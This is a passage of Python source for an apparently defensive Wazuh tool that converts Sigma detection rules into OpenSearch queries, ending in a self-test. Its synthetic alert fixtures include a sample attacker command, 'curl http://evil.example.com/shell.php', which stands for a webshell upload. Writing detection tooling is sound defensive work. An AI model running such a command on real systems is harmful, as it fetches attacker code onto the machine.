    _audit_log("blueteam_sigma_rule_save", {
        "rule_title": title,
        "filename": target.name,
        "rule_sha256": hashlib.sha256(params.rule_source.encode()).hexdigest()[:16],
    })
    payload = {
        "saved": True,
        "path": str(target),
        "rule_title": title,
        "bytes": target.stat().st_size,
        "findings": _static_checks(doc),
        "valid": True,
    }
    if params.response_format == "json":
        return _truncate_if_needed(json.dumps(payload, indent=2),
                                   bypass=params.bypass_character_limit)
    lines = [f"## Sigma rule saved: `{title}`", "", f"Path: `{target}`",
             f"Bytes: {payload['bytes']}",
             "", "> Staging only. Promote manually after review.", ""]
    if payload["findings"]:
        lines += ["**Quality findings**"] + [f"- {f}" for f in payload["findings"]]
    return _truncate_if_needed("\n".join(lines), bypass=params.bypass_character_limit)


@blueteam_tool(
    name="blueteam_sigma_rule_convert",
    annotations={"readOnlyHint": True, "destructiveHint": False,
                 "idempotentHint": True, "openWorldHint": False},
    audit=False, truncate=True, redact=False,
)
async def blueteam_sigma_rule_convert(params: SigmaRuleConvertInput) -> str:
    """Convert a Sigma rule into an OpenSearch query or Dashboards artifact.

    Wazuh target: none at conversion time. ``verify_fields=True`` reads the
    **Indexer API** `_field_caps` endpoint to report fields the index does not
    map. The Manager API is not used. No rule and no monitoring artifact is
    created by this tool; the output is text for an operator to review.

    Requires pySigma (pysigma + pySigma-backend-opensearch). When it is absent
    the tool returns an install hint, not a crash.

    Known semantic loss to read before trusting a converted query: a ``|cidr``
    modifier converts to a literal Lucene term (``data.srcip:10.0.0.0\\/8``),
    which OpenSearch reads as the string "10.0.0.0/8" and not as a network
    match. Rewrite those clauses as term or range queries on the IP field.

    Args:
        params.rule_source: Sigma YAML, one rule or a collection.
        params.output_format: 'lucene' | 'dsl' | 'monitor' | 'saved_search'.
        params.index_pattern: Index the artifact targets.
        params.monitor_interval: Minutes between monitor runs.
        params.verify_fields: Probe the Indexer for unmapped fields.
        params.response_format: 'markdown' (default) or 'json'.

    Returns:
        markdown with the query in a code block, or json with queries,
        output_format, index_pattern, fields, field_mapping, unmapped_fields,
        versions, errors.

    Examples:
        1. output_format='lucene' -> `data.url:*\\/shell.php*`, paste into Discover.
        2. output_format='dsl' -> an OpenSearch _search body ready for
           blueteam_dsl_query or a direct curl.
        3. output_format='monitor' -> a Dashboards alerting monitor targeting
           wazuh-alerts-*, never the pySigma default beats-*.

    Permissions: read on the Wazuh Indexer when verify_fields=true.
    Rate limits: one _field_caps probe per call. No external API is contacted.
    """
    doc, yaml_errors = _schema_of(params.rule_source)
    if doc is None:
        raise BlueTeamMCPError(
            f"Refusing to convert an unparseable rule: "
            f"{yaml_errors[0] if yaml_errors else 'yaml error'}")

    index_pattern = (params.index_pattern
                     or (config.sigma.index_pattern if config else "wazuh-alerts-*"))
    monitor_interval = (params.monitor_interval
                        if params.monitor_interval is not None
                        else (config.sigma.monitor_interval if config else 5))
    verify_fields = (params.verify_fields if params.verify_fields is not None
                     else (config.sigma.verify_fields if config else True))

    converted = sigma_engine.convert(
        params.rule_source,
        output_format=params.output_format,
        index_pattern=index_pattern,
        monitor_interval=monitor_interval,
    )

    unmapped: list[str] = []
    if verify_fields and converted["fields"]:
        caps = await _wazuh_indexer_field_caps(list(converted["fields"]))
        if caps:
            unmapped = [f for f in converted["fields"] if f not in caps]

    title = doc.get("title") if isinstance(doc.get("title"), str) else "untitled"
    _audit_log("blueteam_sigma_rule_convert", {
        "rule_title": title,
        "output_format": params.output_format,
        "index_pattern": index_pattern,
        "rule_sha256": hashlib.sha256(params.rule_source.encode()).hexdigest()[:16],
    })

    payload = dict(converted, rule_title=title, unmapped_fields=unmapped,
                   verify_ran=bool(verify_fields and converted["fields"]))
    if params.response_format == "json":
        return _truncate_if_needed(json.dumps(payload, indent=2),
                                   bypass=params.bypass_character_limit)

    lines = [f"## Sigma conversion: `{title}`", "",
             f"Format: **{params.output_format}** | index: `{index_pattern}` | "
             f"rules: {len(converted['queries'])}", ""]
    if not converted["index_retargeted"]:
        lines += ["**WARNING: index retarget failed.** The upstream payload shape "
                  f"changed and this artifact may still target the pySigma default "
                  f"index instead of `{index_pattern}`. Inspect the `index` field "
                  "below before importing it into Dashboards, and re-check the "
                  "upstream `finalize_query_kibana_ndjson` shape.", ""]
    for i, q in enumerate(converted["queries"], 1):
        body = q if isinstance(q, str) else json.dumps(q, indent=2)
        lang = "text" if params.output_format == "lucene" else "json"
        if len(converted["queries"]) > 1:
            lines.append(f"**Rule {i}**")
        lines += [f"```{lang}", body.rstrip(), "```", ""]
    if params.output_format == "lucene":
        lines += ["> Paste into OpenSearch Dashboards Discover. This is a query "
                  "string, not a monitoring rule.", ""]
    if params.output_format == "monitor":
        lines += ["Test with a short interval and an empty actions list before "
                  "adding a notification target.", ""]
    if converted["errors"]:
        lines += ["**Engine errors**"] + [f"{e}" for e in converted["errors"]] + [""]
    if unmapped:
        lines += [f"**Unmapped fields** (the index does not know these, so the "
                  f"query cannot match): {unmapped}", ""]
    if "|cidr" in params.rule_source:
        lines += ["> This rule uses |cidr. pySigma converts it to a literal term, "
                  "not a network match. Rewrite those clauses by hand.", ""]
    if converted["versions"]:
        lines += [f"Engine: {converted['versions']}"]
    return _truncate_if_needed("\n".join(lines), bypass=params.bypass_character_limit)


if __name__ == "__main__":
    # Self-check: the pure pipeline must build a schema-valid, pySigma-safe rule
    # from synthetic alert docs, and the field ranking must be deterministic.
    docs = [
        {"data": {"url": "http://evil.example.com/shell.php", "domain": "evil.example.com",
                  "command": "curl http://evil.example.com/shell.php"},
         "rule": {"id": "5710", "level": 10, "description": "Attempt to upload webshell",
                  "groups": ["web", "attack"], "mitre": {"id": ["T1505.003", "T1071"]}},
         "decoder": {"name": "web-accesslog"}},
        {"data": {"url": "http://evil.example.com/shell.php?id=1", "domain": "evil.example.com"},
         "rule": {"id": "5710", "level": 8, "groups": ["web"]},
         "decoder": {"name": "web-accesslog"}},
    ]
    params = SigmaRuleGenerateInput(mode="alert", srcip="203.0.113.9")
    values = _harvest_values(docs)
    assert values["data.url"], "URLs must be harvested"
    assert values["data.domain"] == ["evil.example.com"], values.get("data.domain")
    assert "index" not in str(values), "generic values must be dropped"

    src, diag = _build_rule(docs, params, values)
    parsed, errs = _schema_of(src)
    assert parsed is not None, errs
    assert parsed["logsource"] == {"product": "wazuh", "category": "webserver"}, parsed["logsource"]
    assert parsed["level"] == "high", parsed["level"]          # max rule.level 10
    assert parsed["detection"]["condition"] == "selection"
    assert parsed["status"] == "experimental"
    assert "attack.t1071" in parsed["tags"], parsed["tags"]
    assert _static_checks(parsed) == [], _static_checks(parsed)

    # Determinism: same docs, same rule source (aside from the uuid4 id).
    src2, _ = _build_rule(docs, params, _harvest_values(docs))
    strip = lambda s: re.sub(r"^id: .*$", "id: X", s, flags=re.MULTILINE)
    assert strip(src) == strip(src2), "rule body must be deterministic"

    # Field caps hold.
    many = [{"data": {"domain": f"h{i}.example.com"}} for i in range(20)]
    assert len(_harvest_values(many)["data.domain"]) == _MAX_VALUES_PER_FIELD

    # Placeholder path: no usable value -> flagged, not silently empty.
    empty_src, empty_diag = _build_rule([{"rule": {"level": 3}}], params, {})
    assert empty_diag["selections"] == {}
    assert "__NO_ATTACKER_VALUE_HARVESTED__" in empty_src

    # Findings fire on a structurally broken rule.
    broken, _ = _schema_of("title: short\nlogsource: {}\ndetection:\n  condition: missing_sel\n")
    assert broken is not None
    ids = " ".join(_static_checks(broken))
    assert "SG1" in ids and "SG6" in ids and "SG7" in ids, ids
    print("sigma_rules self-check OK: level", parsed["level"], "tags", parsed["tags"])
